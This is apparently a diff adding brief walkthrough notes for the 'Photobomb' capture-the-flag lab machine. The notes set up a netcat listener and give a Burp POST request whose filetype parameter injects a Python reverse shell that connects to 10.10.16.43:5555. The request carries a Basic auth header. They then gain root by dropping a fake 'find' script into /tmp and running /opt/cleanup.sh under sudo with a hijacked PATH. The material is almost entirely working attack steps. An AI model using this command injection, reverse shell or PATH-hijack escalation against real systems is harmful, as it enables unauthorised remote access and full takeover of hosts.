@@ -1,0 +1,37 @@
+Setup a nc listener
+    nc -nvlp 5555
+POST request in Burp suite:
+###############################################################################################################################################################
+POST /printer HTTP/1.1
+Host: photobomb.htb
+Content-Length: 299
+Cache-Control: max-age=0
+Authorization: Basic cEgwdDA6YjBNYiE=
+Upgrade-Insecure-Requests: 1
+Origin: http://photobomb.htb
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://photobomb.htb/printer
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+photo=tabitha-turner-8hg0xRg5QIs-unsplash.jpg&filetype=jpg;export RHOST="10.10.16.43";export RPORT=5555;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'
+&dimensions=3000x2000
+###############################################################################################################################################################
+cd
+ls -la
+cat user.txt
+ls /opt
+Found /opt/cleanup.sh
+find command runs without absolute path
+cd /tmp
+touch find
+echo "/bin/bash -p" > find
+chmod +x find
+sudo PATH=/tmp:$PATH /opt/cleanup.sh
+Got Root:
+cd
+ls -la
+cat root.txt
